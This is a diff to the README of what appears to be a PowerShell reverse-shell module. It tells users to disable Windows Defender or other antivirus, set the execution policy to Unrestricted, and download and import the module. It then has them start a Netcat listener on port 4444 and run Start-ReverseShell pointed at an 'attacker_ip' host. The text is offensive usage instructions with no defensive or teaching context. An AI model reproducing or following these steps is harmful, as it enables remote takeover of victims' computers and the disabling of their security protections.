@@ -18,7 +18,7 @@ To install the script, you can download the script from the GitHub repository an
 ## Requirements
 1) Disable Windows Defender Real Time Protection  or any other Antivirus 
 2) Add to Policy Execution
-3) Run as Administrator
+3) Run a Terminal as Administrator
 
 ```powershell
 PS C:\> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser 
@@ -32,12 +32,20 @@ PS C:\> Invoke-WebRequest -Uri "https://raw.githubusercontent.com/okpalandev/PSM
 ```powershell
 PS C:\> Import-Module .\ReverseShell.psm1
 ```
+Then on the attacker machine, you can listen for the connection using Netcat or any other tool that can listen for incoming connections on the specified port.
+
+```bash
+$ nc -lvp 4444
+```
+    
+Finally, you can start the reverse shell on the target machine by running the following command:
 
 ```powershell
-PS C:\> Start-ReverseShell -IPAddress "attacker_ip " -Port " attacker_port "
+PS C:\> Start-ReverseShell -IPAddress "attacker_ip" -Port " 4444 " 
 ```
+
 
 
 ## License
 This script is licensed under the MIT License. See the LICENSE file for more information.
-```
+
